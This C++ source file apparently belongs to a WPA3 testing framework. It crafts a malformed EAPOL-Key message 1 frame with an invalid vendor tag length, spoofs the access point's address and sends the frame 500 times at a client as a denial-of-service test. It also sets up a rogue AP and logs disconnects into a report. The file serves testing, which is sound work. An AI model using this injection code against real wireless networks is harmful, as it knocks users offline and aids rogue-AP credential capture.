#include <optional>
#include <nlohmann/json.hpp>
#include <tins/hw_address.h>
#include <tins/llc.h>
#include <tins/packet_sender.h>
#include <tins/rawpdu.h>

#include "attacks/components/setup_connections.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "logger/log.h"
#include "logger/report.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::eapol_logoff{
using namespace std;
using namespace filesystem;
using namespace Tins;

RadioTap get_malformed_eapol(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, Channel ap_channel){
	// 802.11 Data/QoS frame
	Dot11Data dot11;
	dot11.addr1(sta_mac);
	dot11.addr2(ap_mac);
	dot11.addr3(ap_mac);
	dot11.addr4(sta_mac);

	string eapol_hex = "02"    // Version: 802.1X-2004 (2)
			"03"               // Type: Key (3)
			"0075"             // Length: 117
			"02"               // Key Descriptor Type: EAPOL RSN Key (2)
			"0088"             // Key Information: 0x0088 -> EAPOL Msg1
			"0010"             // Key Length: 16
			"0000000000000005" // Replay Counter: 5
			// WPA Key Nonce
			"00000000000000000000000000000000" "00000000000000000000000000000000" "00000000000000000000000000000000"
			// Key IV
			"0000000000000000"                 // WPA Key RSC
			"0000000000000000"                 // WPA Key ID
			"00000000000000000000000000000000" // WPA Key MIC
			"0016"                             // WPA Key Data Length: 22
			//WPA Key Data
			"dd"                                //Tag Number: Vendor Specific (221)
			"ff"                                // Tag length: 255  <-- INVALID length !!!!
			"000fac"                            // OUI: 00:0f:ac (Ieee 802.11)
			"04"                                // Vendor Specific OUI Type: 4
			"00000000000000000000000000000000"; // PMKID

	vector<uint8_t> eapol_bytes;
	for(size_t i = 0; i < eapol_hex.size(); i += 2){
		string byte = eapol_hex.substr(i, 2);
		eapol_bytes.push_back(static_cast<uint8_t>(strtol(byte.c_str(), nullptr, 16)));
	}
	while(eapol_bytes.size() < 8) eapol_bytes.push_back(0x00);

	// Prepend SNAP bytes directly: OUI (3) + Type (2)
	vector<uint8_t> snap_bytes = {0x00, 0x00, 0x00, 0x88, 0x8e};
	eapol_bytes.insert(eapol_bytes.begin(), snap_bytes.begin(), snap_bytes.end());

	RawPDU raw_eapol(eapol_bytes);
	LLC llc(0xAA, 0xAA);

	llc.inner_pdu(raw_eapol);
	llc.type(LLC::UNNUMBERED);
	llc.modifier_function(LLC::UI);
	dot11.inner_pdu(llc);

	//WLAN flags
	dot11.from_ds(1); // From DS bit

	RadioTap radiotap;
	auto my_flags = static_cast<RadioTap::FrameFlags>(RadioTap::CFP | RadioTap::WEP);
	radiotap.flags(my_flags);
	radiotap.rate(2); // Rate in Mbps
	radiotap.channel(hw_capabilities::channel_to_freq(ap_channel), RadioTap::CCK);

	radiotap.inner_pdu(dot11);
	return radiotap;
}

void setup_attack(RunStatus &rs){
	components::client_ap_setup(rs);
	components::setup_rogue_ap(rs);

}

void run_attack(RunStatus &rs){
	rs.start_observers();

	const string iface_name = rs.get_actor("attacker")["iface"];
	const NetworkInterface iface(iface_name);
	const Channel channel = rs.get_actor("access_point")->get_channel();

	RadioTap radiotap = get_malformed_eapol(rs.get_actor("access_point").get(SK::mac),
											rs.get_actor("client").get(SK::mac), channel);
	PacketSender sender;

	this_thread::sleep_for(chrono::seconds(5));
	for(int i = 0; i < 500; ++i){ //TODO attack_config packets /time?
		sender.send(radiotap, iface);
		this_thread::sleep_for(chrono::milliseconds(10));
	}
	//TODO add possibility for internal actors
	//rs.process_manager.stop("access_point");
	this_thread::sleep_for(chrono::seconds(7)); //to check connection after attack
}

void generate_report(const RunStatus &rs, const path &STA_graph_path, const path &AP_graph_path,
					const path &rogue_graph_path){
	report::ReportGuard report(rs.run_folder());
	if(!report) return;

	report << "# Malformed EAPOL-1 DoS Attack\n\n";
	report::attack_mapping_table(report, rs);
	if(!STA_graph_path.empty()){
		report << "### STA (client, wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
		report << "![STA Throughput Graph](" << STA_graph_path << ")\n\n";
	}
	if(!AP_graph_path.empty()){
		report << "### AP (access_point, hostapd " << hostapd::get_version(rs, "access_point") << ")\n";
		report << "![AP Throughput Graph](" << AP_graph_path << ")\n\n";
	}
	if(!rogue_graph_path.empty()){
		report << "### Rogue AP (rogue_ap)\n";
		report << "![Rogue AP Throughput Graph](" << rogue_graph_path << ")\n\n";
	}
	report << "---\n";
}

void stats(const RunStatus &rs){
	vector<unique_ptr<GraphElements>> elements;

	rs.log_events(elements, {
					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
					{"client", START_tag, "START", "black"},
					{"client", END_tag, "END", "black"},
				});

	optional<bool> rogue_ap_connected;
	if(rs.config().at("actors").contains("rogue_ap")){
		const auto mana_events = get_time_logs(rs, "rogue_ap", "Captured a WPA", true);
		elements.push_back(make_unique<EventLines>(mana_events, "MANA", "black"));
		rogue_ap_connected = !mana_events.empty();
	}

	const path STA_graph_path = observer::tshark::tshark_graph(rs, "client", elements);
	const path AP_graph_path = observer::tshark::tshark_graph(rs, "access_point", elements);
	const path rogue_graph_path = observer::tshark::tshark_graph(rs, "rogue_ap", elements);

	const auto disc_times = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED", true);
	nlohmann::json result = {{"disconnect_count", static_cast<int>(disc_times.size())}};
	if(rogue_ap_connected.has_value()) result["rogue_ap_connected"] = rogue_ap_connected.value();
	rs.save_result(result);

	generate_report(rs, STA_graph_path, AP_graph_path, rogue_graph_path);
}
}
